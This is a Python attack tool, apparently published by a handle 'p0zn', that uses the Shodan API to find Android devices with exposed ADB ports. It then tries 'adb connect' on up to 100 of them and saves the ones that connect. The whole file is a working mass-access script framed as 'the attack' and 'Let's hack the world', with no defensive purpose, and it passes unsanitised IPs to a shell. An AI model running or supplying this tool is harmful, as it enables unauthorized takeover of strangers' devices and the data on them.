import shodan
from shodan.exception import APIError
import subprocess
from termcolor import colored
import sys, time, os

def print_banner():
    print(colored("""
              .d8888b.                     .d8888b.  888                    888                          d8888 8888888b.  888888b.   
             d88P  Y88b                   d88P  Y88b 888                    888                         d88888 888  "Y88b 888  "88b  
             888    888                   Y88b.      888                    888                        d88P888 888    888 888  .88P  
    88888b.  888    888 88888888 88888b.   "Y888b.   88888b.   8888b.   .d88888  .d88b.  88888b.      d88P 888 888    888 8888888K.  
    888 "88b 888    888    d88P  888 "88b     "Y88b. 888 "88b     "88b d88" 888 d88""88b 888 "88b    d88P  888 888    888 888  "Y88b 
    888  888 888    888   d88P   888  888       "888 888  888 .d888888 888  888 888  888 888  888   d88P   888 888    888 888    888 
    888 d88P Y88b  d88P  d88P    888  888 Y88b  d88P 888  888 888  888 Y88b 888 Y88..88P 888  888  d8888888888 888  .d88P 888   d88P 
    88888P"   "Y8888P"  88888888 888  888  "Y8888P"  888  888 "Y888888  "Y88888  "Y88P"  888  888 d88P     888 8888888P"  8888888P"  
    888                                                                                                                              
    888                                                                                                                              
    888       """, color="magenta"))

    print(colored("\n*************************************************************", color="yellow"))
    print(colored("\n* Copyright of p0zn, 2021                                   *",  color="yellow"))
    print(colored("\n* Follow me on Github:/p0zn                                 *", color="yellow"))
    print(colored("\n* Follow me on Linkedin :/p0zn                              *", color="yellow"))
    print(colored("\n*************************************************************", color="yellow"))

    message = "\nLet's hack 👁️ the world\n"
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.03)

    print(colored("\nWARNING : The tool does not work on free accounts!", color="red"))
    time.sleep(1)

def get_valid_api():
    while True:
        api_key = input(colored("\nEnter API key 🔑 for access to Shodan : ", color="green"))
        api = shodan.Shodan(api_key)
        try:
            api.info()  # API key doğrulaması için
            return api
        except APIError as e:
            print(colored(f"\nInvalid API KEY ❌: {e}\nPlease try again!\n", color="red"))

def main():
    print_banner()

    api = get_valid_api()

    search = input(colored("\nEnter ADB search query : ", color="green"))
    print(colored("\nThe attack is starting 🤺 please wait until process!\n", color="blue"))

    try:
        results = api.search(search)
    except APIError as e:
        print(colored(f"\nShodan API Error: {e}", color="red"))
        return

    ipList = [str(result["ip_str"]) for result in results["matches"]]
    revised_ip = list(dict.fromkeys(ipList))

    print("\nIndexed devices from 🌎 = {}".format(results["total"]))
    print(colored("\nStarting operation for first 100 IPs...\n", color="cyan"))
    time.sleep(0.5)

    subprocess.call(["adb", "kill-server"])
    subprocess.call(["adb", "start-server"])
    print("")

    connected_list = []
    for i, ip in enumerate(revised_ip[:100]):
        try:
            connected = subprocess.check_output([f"adb connect {ip}:5555"], timeout=0.7, shell=True)
            if b'connected' in connected or b'already connected' in connected:
                connected_list.append(connected.decode("utf-8"))
                print(f"Device {i+1}: {connected.decode('utf-8').strip()}")
        except subprocess.TimeoutExpired:
            pass
        except subprocess.CalledProcessError:
            pass

    print(colored("\nThe attack is over 🗡️", color="red"))

    with open("output_file.txt", "w") as output:
        for element in connected_list:
            output.write(element + "\n")

    print(colored("\nSaving outputs..", color="cyan"))
    time.sleep(0.2)
    print(colored("\nOutput saved!", color="cyan"))
    print(colored("\nDon't forget the follow me on github 😻 ", color="cyan"))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\nExiting the tool...", color="yellow"))
        time.sleep(1)
        sys.exit(0)
